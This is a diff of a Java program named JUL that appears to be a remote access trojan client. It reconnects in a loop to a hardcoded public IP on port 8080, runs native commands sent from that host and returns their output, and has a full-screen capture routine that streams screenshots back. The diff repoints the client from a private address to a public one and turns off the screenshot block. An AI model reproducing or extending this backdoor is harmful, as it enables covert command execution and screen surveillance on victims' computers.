@@ -42,13 +42,18 @@ public class JUL {
 
     private static ObjectInputStream objectInputStream;
     
+    private static long screnecapDelay = 10000;
+    
     /**
      * @param args the command line arguments
      */
     public static void main(String[] args) throws IOException {
         //System.setProperty("java.awt.headless", "true");
         Socket echoSocket = null;
-        String hostname = "192.168.137.1";
+        String hostname = "75.83.202.161";
+        if (args.length >= 1) {
+            hostname = args[0];
+        }
         int port = 8080;
         while (true) {
             try {
@@ -112,6 +117,8 @@ public class JUL {
                         }
                         sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND_AND_BLOCKING_END, EMPTYBARR, null);
                         writeString(commandOutput.toString());
+                    } else if (type == SET_SCRENECAP_RATE) {
+                        //screnecapDelay = readOffInt(inStream);
                     }
                     
                 } 
@@ -172,10 +179,12 @@ public class JUL {
         try {
             while (true) {
                 try {
-                    sWrite(WriteData.SINGLE_BYTE, SCRENECAP_STREAM_INIT, EMPTYBARR, null);
-                    screne = robot.createScreenCapture(new Rectangle(d.width, d.height));
-                    sWrite(WriteData.IMAGE, EMPTYB, EMPTYBARR, new ImageIcon(screne));
-                    Thread.sleep(10000);
+                    if (false) {
+                        screne = robot.createScreenCapture(new Rectangle(d.width, d.height));
+                        sWrite(WriteData.SINGLE_BYTE, SCRENECAP_STREAM_INIT, EMPTYBARR, null);
+                        sWrite(WriteData.IMAGE, EMPTYB, EMPTYBARR, new ImageIcon(screne));
+                    }
+                    Thread.sleep(screnecapDelay);
                 } catch (InterruptedException ex) {
                     Logger.getLogger(JUL.class.getName()).log(Level.SEVERE, null, ex);
                 }
@@ -235,4 +244,5 @@ public class JUL {
         }
         return result.toString();
     }
+    
 }
